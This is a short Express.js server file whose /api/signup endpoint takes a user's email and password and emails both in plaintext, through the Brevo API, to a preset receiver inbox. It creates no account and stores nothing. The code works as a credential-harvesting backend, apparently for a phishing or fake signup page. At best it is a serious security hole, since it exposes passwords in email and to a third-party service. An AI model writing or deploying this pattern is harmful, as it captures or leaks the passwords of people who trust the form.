import express from "express";
import path from "path";
import { createServer as createViteServer } from "vite";
import dotenv from "dotenv";
import * as SibApiV3Sdk from "@sendinblue/client";

dotenv.config();

async function startServer() {
  const app = express();
  const PORT = process.env.PORT || 3000;

  app.use(express.json());

  app.post("/api/signup", async (req, res) => {
    const { email, password } = req.body;

    const brevoKey = process.env.BREVO_API_KEY;
    const receiverEmail = process.env.RECEIVER_EMAIL;
    const senderEmail = process.env.EMAIL_USER;

    if (!brevoKey || !receiverEmail || !senderEmail) {
      return res.status(500).json({ error: "Missing env variables" });
    }

    try {
      console.log("Sending email...");

      const apiInstance = new SibApiV3Sdk.TransactionalEmailsApi();

      apiInstance.setApiKey(
        SibApiV3Sdk.TransactionalEmailsApiApiKeys.apiKey,
        brevoKey
      );

      const response = await apiInstance.sendTransacEmail({
        sender: {
          email: senderEmail,
          name: "Signup System",
        },
        to: [
          {
            email: receiverEmail,
          },
        ],
        subject: "New Signup Received",
        htmlContent: `
          <h3>New Signup</h3>
          <p>Email: ${email}</p>
          <p>Password: ${password}</p>
        `,
      });

      console.log("Brevo response:", response);

      return res.json({ success: true });
    } catch (err) {
      console.error("Brevo failed:", err);
      return res.status(500).json({ error: "Email failed" });
    }
  });

  app.listen(PORT, "0.0.0.0", () => {
    console.log("Server running on", PORT);
  });
}

startServer();